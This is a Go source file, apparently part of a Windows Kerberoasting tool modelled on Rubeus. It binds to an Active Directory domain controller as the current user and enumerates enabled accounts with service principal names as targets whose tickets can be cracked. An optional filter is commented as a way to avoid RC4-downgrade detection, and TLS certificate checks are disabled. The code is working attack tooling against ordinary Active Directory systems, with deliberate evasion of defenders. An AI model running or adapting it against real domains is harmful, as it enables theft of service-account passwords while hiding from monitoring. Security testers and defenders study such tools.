//go:build windows
// +build windows

package main

import (
	"crypto/tls"
	"fmt"
	"strconv"
	"strings"
	"time"

	"github.com/go-ldap/ldap/v3"
	"github.com/go-ldap/ldap/v3/gssapi"
)

// userAccountControl flag and msDS-SupportedEncryptionTypes constants.
const (
	uacAccountDisabled = 0x0002

	etypeDES_CRC   = 0x01
	etypeDES_MD5   = 0x02
	etypeRC4_HMAC  = 0x04
	etypeAES128    = 0x08
	etypeAES256    = 0x10
)

// searchRoastableUsersLDAP binds to the DC over LDAP using the current logon
// session and returns every account that has an SPN set (or just one user).
func searchRoastableUsersLDAP(cfg *Config) ([]roastTarget, error) {
	conn, err := connectAndBindLDAP(cfg)
	if err != nil {
		// Many DCs require LDAP signing/sealing for plaintext binds, but
		// go-ldap's GSSAPI bind cannot negotiate a SASL security layer. LDAPS
		// satisfies the "channel already protected" requirement, so fall back.
		if !cfg.UseLDAPS && ldap.IsErrorAnyOf(err,
			ldap.LDAPResultStrongAuthRequired, ldap.LDAPResultConfidentialityRequired) {
			fmt.Print("[*] DC requires signing for plaintext LDAP; retrying over LDAPS (636)\r\n")
			cfg.UseLDAPS = true
			conn, err = connectAndBindLDAP(cfg)
		}
		if err != nil {
			return nil, err
		}
	}
	defer conn.Close()

	baseDN, err := defaultNamingContext(conn)
	if err != nil {
		return nil, err
	}

	filter := buildUserFilter(cfg)
	req := ldap.NewSearchRequest(
		baseDN,
		ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 0, 0, false,
		filter,
		[]string{"sAMAccountName", "servicePrincipalName", "distinguishedName", "pwdLastSet", "msDS-SupportedEncryptionTypes"},
		nil,
	)

	res, err := conn.SearchWithPaging(req, 1000)
	if err != nil {
		return nil, fmt.Errorf("LDAP search failed: %w", err)
	}

	targets := make([]roastTarget, 0, len(res.Entries))
	for _, e := range res.Entries {
		spns := e.GetAttributeValues("servicePrincipalName")
		if len(spns) == 0 {
			continue
		}
		targets = append(targets, roastTarget{
			SAMAccountName:    e.GetAttributeValue("sAMAccountName"),
			DistinguishedName: e.GetAttributeValue("distinguishedName"),
			SPN:               spns[0], // first SPN is sufficient to roast the account
			PwdLastSet:        formatPwdLastSet(e.GetAttributeValue("pwdLastSet")),
			SupportedETypes:   formatSupportedETypes(e.GetAttributeValue("msDS-SupportedEncryptionTypes")),
		})
	}
	return targets, nil
}

// connectAndBindLDAP dials the DC and performs a GSSAPI (Kerberos) bind as the
// current user via Windows SSPI - no password required. Over LDAPS it binds the
// channel (RFC 5929 tls-server-end-point) so hardened DCs that enforce LDAP
// channel binding (EPA / SEC_E_BAD_BINDINGS) accept the bind.
func connectAndBindLDAP(cfg *Config) (*ldap.Conn, error) {
	conn, err := dialLDAP(cfg)
	if err != nil {
		return nil, err
	}

	var gssClient *gssapi.SSPIClient
	if cs, ok := conn.TLSConnectionState(); ok && len(cs.PeerCertificates) > 0 {
		gssClient, err = gssapi.NewSSPIClientWithChannelBinding(cs.PeerCertificates[0])
	} else {
		gssClient, err = gssapi.NewSSPIClient()
	}
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("acquiring SSPI credentials: %w", err)
	}
	defer gssClient.Close()

	if err := conn.GSSAPIBind(gssClient, "ldap/"+cfg.DC, ""); err != nil {
		conn.Close()
		return nil, fmt.Errorf("LDAP GSSAPI bind to %s failed: %w", cfg.DC, err)
	}
	return conn, nil
}

// dialLDAP opens an LDAP or LDAPS connection to the configured DC.
func dialLDAP(cfg *Config) (*ldap.Conn, error) {
	if cfg.UseLDAPS {
		url := fmt.Sprintf("ldaps://%s:636", cfg.DC)
		return ldap.DialURL(url, ldap.DialWithTLSConfig(&tls.Config{InsecureSkipVerify: true}))
	}
	return ldap.DialURL(fmt.Sprintf("ldap://%s:389", cfg.DC))
}

// defaultNamingContext reads the domain naming context from RootDSE.
func defaultNamingContext(conn *ldap.Conn) (string, error) {
	req := ldap.NewSearchRequest(
		"", ldap.ScopeBaseObject, ldap.NeverDerefAliases, 0, 0, false,
		"(objectClass=*)", []string{"defaultNamingContext"}, nil,
	)
	res, err := conn.Search(req)
	if err != nil {
		return "", fmt.Errorf("reading RootDSE: %w", err)
	}
	if len(res.Entries) == 0 {
		return "", fmt.Errorf("RootDSE returned no entries")
	}
	dn := res.Entries[0].GetAttributeValue("defaultNamingContext")
	if dn == "" {
		return "", fmt.Errorf("could not determine defaultNamingContext")
	}
	return dn, nil
}

// buildUserFilter mirrors Rubeus' kerberoast LDAP targeting: accounts with an
// SPN that are not disabled, excluding krbtgt; optionally scoped to one user.
func buildUserFilter(cfg *Config) string {
	var userPart string
	if cfg.User != "" {
		userPart = fmt.Sprintf("(sAMAccountName=%s)", ldap.EscapeFilter(cfg.User))
	} else {
		userPart = "(!(sAMAccountName=krbtgt))"
	}
	filter := fmt.Sprintf(
		"(&(samAccountType=805306368)(servicePrincipalName=*)%s(!(userAccountControl:1.2.840.113556.1.4.803:=%d)))",
		userPart, uacAccountDisabled,
	)
	if cfg.RC4OpSec {
		// Exclude only accounts that *advertise* AES support
		// (msDS-SupportedEncryptionTypes has AES128 0x8 or AES256 0x10). For
		// everything else - including accounts where the attribute is unset -
		// requesting an RC4 ticket raises no RC4-downgrade signal, because the
		// downgrade detection keys on accounts that advertise AES yet received
		// RC4. (Matches Rubeus /rc4opsec.) Bitwise OR matching rule = .804.
		filter = fmt.Sprintf(
			"(&%s(!(msDS-SupportedEncryptionTypes:1.2.840.113556.1.4.804:=%d)))",
			filter, etypeAES128|etypeAES256,
		)
	}
	if cfg.ExtraFilter != "" {
		filter = fmt.Sprintf("(&%s(%s))", filter, cfg.ExtraFilter)
	}
	return filter
}

// formatPwdLastSet converts an AD FILETIME integer to a readable timestamp.
func formatPwdLastSet(raw string) string {
	if raw == "" || raw == "0" {
		return ""
	}
	ft, err := strconv.ParseInt(raw, 10, 64)
	if err != nil || ft == 0 {
		return ""
	}
	// FILETIME: 100ns intervals since 1601-01-01.
	const ticksPerSecond = 10_000_000
	const epochDiff = 11644473600 // seconds between 1601 and 1970
	secs := ft/ticksPerSecond - epochDiff
	return time.Unix(secs, 0).UTC().Format("2006-01-02 15:04:05 MST")
}

// formatSupportedETypes decodes msDS-SupportedEncryptionTypes into names.
func formatSupportedETypes(raw string) string {
	if raw == "" {
		return ""
	}
	v, err := strconv.Atoi(raw)
	if err != nil || v == 0 {
		return ""
	}
	var parts []string
	if v&etypeDES_CRC != 0 {
		parts = append(parts, "DES-CBC-CRC")
	}
	if v&etypeDES_MD5 != 0 {
		parts = append(parts, "DES-CBC-MD5")
	}
	if v&etypeRC4_HMAC != 0 {
		parts = append(parts, "RC4-HMAC")
	}
	if v&etypeAES128 != 0 {
		parts = append(parts, "AES128-CTS-HMAC-SHA1-96")
	}
	if v&etypeAES256 != 0 {
		parts = append(parts, "AES256-CTS-HMAC-SHA1-96")
	}
	return strings.Join(parts, ", ")
}
